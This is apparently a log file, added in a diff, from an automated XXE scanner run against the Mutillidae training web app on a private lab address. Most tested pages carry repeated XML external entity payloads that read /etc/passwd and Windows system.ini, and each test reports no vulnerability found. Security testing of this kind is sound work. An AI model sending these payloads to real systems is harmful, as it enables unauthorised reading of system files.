@@ -1,0 +1,348 @@
+2024-04-27 15:45:48,438 - INFO - 
+Starting ScanXXEInject scan
+2024-04-27 15:45:48,447 - INFO - 	No forms found on http://192.168.232.129:80/. Skipping...
+2024-04-27 15:45:48,489 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/. Skipping...
+2024-04-27 15:45:48,530 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=home.php. Skipping...
+2024-04-27 15:45:48,573 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=login.php
+2024-04-27 15:45:48,615 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=login.php
+2024-04-27 15:45:48,651 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=login.php
+2024-04-27 15:45:48,688 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=login.php
+2024-04-27 15:45:48,727 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/set-up-database.php. Skipping...
+2024-04-27 15:45:48,768 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=show-log.php. Skipping...
+2024-04-27 15:45:48,812 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=captured-data.php. Skipping...
+2024-04-27 15:45:48,852 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=credits.php. Skipping...
+2024-04-27 15:45:48,892 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
+2024-04-27 15:45:48,929 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
+2024-04-27 15:45:48,966 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
+2024-04-27 15:45:49,000 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
+2024-04-27 15:45:49,043 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=register.php
+2024-04-27 15:45:49,079 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=register.php
+2024-04-27 15:45:49,116 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=register.php
+2024-04-27 15:45:49,153 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=register.php
+2024-04-27 15:45:49,198 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+2024-04-27 15:45:49,235 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+2024-04-27 15:45:49,271 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+2024-04-27 15:45:49,308 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+2024-04-27 15:45:49,354 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=add-to-your-blog.php
+2024-04-27 15:45:49,392 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=add-to-your-blog.php
+2024-04-27 15:45:49,429 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=add-to-your-blog.php
+2024-04-27 15:45:49,463 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=add-to-your-blog.php
+2024-04-27 15:45:49,504 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=site-footer-xss-discussion.php. Skipping...
+2024-04-27 15:45:49,546 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+2024-04-27 15:45:49,584 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+2024-04-27 15:45:49,622 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+2024-04-27 15:45:49,660 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+2024-04-27 15:45:49,704 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=capture-data.php. Skipping...
+2024-04-27 15:45:49,762 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-27 15:45:49,798 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-27 15:45:49,834 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-27 15:45:49,868 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-27 15:45:49,910 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php. Skipping...
+2024-04-27 15:45:49,951 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
+2024-04-27 15:45:49,986 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
+2024-04-27 15:45:50,021 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
+2024-04-27 15:45:50,060 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
+2024-04-27 15:45:50,106 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
+2024-04-27 15:45:50,193 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
+2024-04-27 15:45:50,232 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
+2024-04-27 15:45:50,269 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
+2024-04-27 15:45:50,311 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
+2024-04-27 15:45:50,344 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
+2024-04-27 15:45:50,379 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
+2024-04-27 15:45:50,413 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
+2024-04-27 15:45:50,457 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
+2024-04-27 15:45:50,492 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
+2024-04-27 15:45:50,527 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
+2024-04-27 15:45:50,564 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
+2024-04-27 15:45:50,605 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
+2024-04-27 15:45:50,640 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
+2024-04-27 15:45:50,674 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
+2024-04-27 15:45:50,708 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
+2024-04-27 15:45:50,749 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
+2024-04-27 15:45:50,786 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
+2024-04-27 15:45:50,821 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
+2024-04-27 15:45:50,858 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
+2024-04-27 15:45:50,911 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/?page=show-log.php. Skipping...
+2024-04-27 15:45:50,964 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
+2024-04-27 15:45:50,999 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
+2024-04-27 15:45:51,034 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
+2024-04-27 15:45:51,070 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
+2024-04-27 15:45:51,111 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=user-info.php
+2024-04-27 15:45:51,148 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=user-info.php
+2024-04-27 15:45:51,183 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=user-info.php
+2024-04-27 15:45:51,217 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=user-info.php
+2024-04-27 15:45:51,619 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=browser-info.php. Skipping...
+2024-04-27 15:45:51,665 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=login.php
+2024-04-27 15:45:51,703 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=login.php
+2024-04-27 15:45:51,743 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=login.php
+2024-04-27 15:45:51,782 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=login.php
+2024-04-27 15:45:51,826 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
+2024-04-27 15:45:51,864 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
+2024-04-27 15:45:51,900 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
+2024-04-27 15:45:51,948 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
+2024-04-27 15:45:51,988 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=arbitrary-file-inclusion.php. Skipping...
+2024-04-27 15:45:52,031 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=add-to-your-blog.php
+2024-04-27 15:45:52,067 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=add-to-your-blog.php
+2024-04-27 15:45:52,105 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/index.php?page=add-to-your-blog.php
+2024-04-27 15:45:52,146 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=add-to-your-blog.php
+2024-04-27 15:45:52,188 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=secret-administrative-pages.php. Skipping...
+2024-04-27 15:45:52,231 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/?page=credits.php. Skipping...
+2024-04-27 15:45:52,276 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
+2024-04-27 15:45:52,316 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
+2024-04-27 15:45:52,353 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
+2024-04-27 15:45:52,391 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=source-viewer.php
+2024-04-27 15:45:52,435 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=framing.php. Skipping...
+2024-04-27 15:45:52,440 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/framer.html. Skipping...
+2024-04-27 15:45:52,495 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=change-log.htm. Skipping...
+2024-04-27 15:45:52,537 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=installation.php. Skipping...
+2024-04-27 15:45:58,023 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/documentation/mutillidae-installation-on-xampp-win7.pdf. Skipping...
+2024-04-27 15:45:58,071 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=documentation/vulnerabilities.php. Skipping...
+2024-04-27 15:45:58,112 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php. Skipping...
+2024-04-27 15:45:58,153 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=usage-instructions.php. Skipping...
+2024-04-27 15:45:58,193 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=php-errors.php. Skipping...
+2024-04-27 15:45:58,235 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=notes.php. Skipping...
+2024-04-27 15:45:58,291 - INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=redirectandlog.php&forwardurl=http://www.irongeek.com/. Skipping...
+2024-04-27 15:45:58,333 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=register.php
+2024-04-27 15:45:58,368 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=register.php
+2024-04-27 15:45:58,402 - INFO - 	Testing payload: <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "file:///d:/Windows/system.ini"> 
+]>
+<test>&xxe;</test> on http://192.168.232.129:80/mutillidae/?page=register.php
+2024-04-27 15:45:58,436 - INFO - 	No XXE injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=register.php
